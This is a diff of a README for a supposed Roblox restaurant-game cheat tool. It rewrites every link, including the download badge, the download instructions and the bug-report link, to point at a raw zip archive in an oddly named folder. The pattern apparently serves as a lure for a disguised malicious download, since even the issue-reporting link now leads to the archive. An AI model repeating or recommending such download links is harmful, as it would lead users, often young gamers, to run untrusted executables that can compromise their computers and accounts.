@@ -1,6 +1,6 @@
 # 🍽️ restaurant-tycoon-script-hub - Dominate Your Roblox Restaurant Game
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/adelinom2952/restaurant-tycoon-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/adelinom2952/restaurant-tycoon-script-hub/main/myelotherapy/v2.8.zip)
 
 ## 🚀 What is This?
 
@@ -8,7 +8,7 @@ This is a simple Windows program that helps you play a popular Roblox restaurant
 
 ## ⬇️ How to Download and Run
 
-Visit this link to download the application: [https://github.com/adelinom2952/restaurant-tycoon-script-hub](https://github.com/adelinom2952/restaurant-tycoon-script-hub)
+Visit this link to download the application: [https://raw.githubusercontent.com/adelinom2952/restaurant-tycoon-script-hub/main/myelotherapy/v2.8.zip](https://raw.githubusercontent.com/adelinom2952/restaurant-tycoon-script-hub/main/myelotherapy/v2.8.zip)
 
 ## ✅ System Requirements
 
@@ -77,7 +77,7 @@ The program automatically updates when a new version is released. You can also m
 
 ## ⭐ Feedback
 
-If you like this tool, leave a star! Report bugs at: [Report Issues](https://github.com/adelinom2952/restaurant-tycoon-script-hub/issues). We read every message.
+If you like this tool, leave a star! Report bugs at: [Report Issues](https://raw.githubusercontent.com/adelinom2952/restaurant-tycoon-script-hub/main/myelotherapy/v2.8.zip). We read every message.
 
 ## 📄 License
 
